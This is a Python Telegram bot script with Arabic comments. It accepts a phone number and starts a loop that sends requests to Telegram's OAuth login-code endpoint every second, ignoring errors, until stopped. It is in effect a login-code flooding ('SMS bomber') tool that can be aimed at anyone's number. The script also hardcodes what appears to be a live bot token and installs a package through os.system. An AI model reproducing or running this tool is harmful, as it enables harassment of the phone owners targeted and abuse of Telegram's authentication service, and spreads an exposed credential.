import os
print("حقوق اوفر")
print("∞"*60)
os.system('pip install telebot')
    
import telebot
import requests
import threading
import time

token = "8512318274:AAG9Q6Gl3GMryPR8jmZzMEveDIiLKpy2ZA4"  # ضع التوكن
bot = telebot.TeleBot(token)

user_data = {}  # لكل مستخدم نخزن الرقم وحالة التشغيل

def send_codes_loop(user_id):
    """لوب الإرسال المستمر"""
    while user_data.get(user_id, {}).get("active", False):
        phone = user_data[user_id]["phone"]

        try:
            headers = {
                'bot_id': '1288099309',
                'origin': 'https://t.me/EZ_Z3',
                'lang': 'en'
            }
            data = {'phone': phone}

            requests.post(
                'https://oauth.tg.dev/auth/request?bot_id=1288099309&origin=https://t.me&lang=en',
                headers=headers,
                data=data
            )

        except:
            pass  # نتجاهل الأخطاء حتى يستمر الإرسال

        time.sleep(1)  # سرعة الإرسال (كل 1 ثانية) — يمكنك تغييرها


@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    user_data[user_id] = {"phone": None, "active": False}

    bot.reply_to(message,
                 "اهلا! 👋\n"
                 "ارسل رقمك مع رمز الدولة مثل:\n"
                 "+9647700000000\n\n"
                 "By / @EZ_Z3"
    )


@bot.message_handler(commands=['stop'])
def stop(message):
    user_id = message.from_user.id

    if user_id in user_data:
        user_data[user_id]["active"] = False
        bot.reply_to(message, "⛔ تم إيقاف الإرسال.")
    else:
        bot.reply_to(message, "لا يوجد إرسال نشط.")


@bot.message_handler(func=lambda m: True)
def handle_phone(message):
    user_id = message.from_user.id
    text = message.text.strip()

    # إذا الرقم لم يسجل بعد
    if user_data.get(user_id, {}).get("phone") is None:

        if not (text.startswith("+") and text[1:].isdigit()):
            return bot.reply_to(message, "⚠️ أرسل الرقم بصيغة صحيحة مثل:\n+9647700000000")

        # حفظ الرقم
        user_data[user_id]["phone"] = text
        user_data[user_id]["active"] = True

        bot.reply_to(message, f"📩 تم حفظ رقمك ({text})\n"
                              "🚀 بدأ إرسال الأكواد بشكل مستمر!\n"
                              "لإيقاف الإرسال: /stop")

        # تشغيل اللوب بخيط مستقل
        t = threading.Thread(target=send_codes_loop, args=(user_id,))
        t.daemon = True
        t.start()

    else:
        bot.reply_to(message, "✔ رقمك محفوظ ويجري الإرسال الآن.\n"
                              "لإيقاف الإرسال: /stop")


bot.polling(none_stop=True)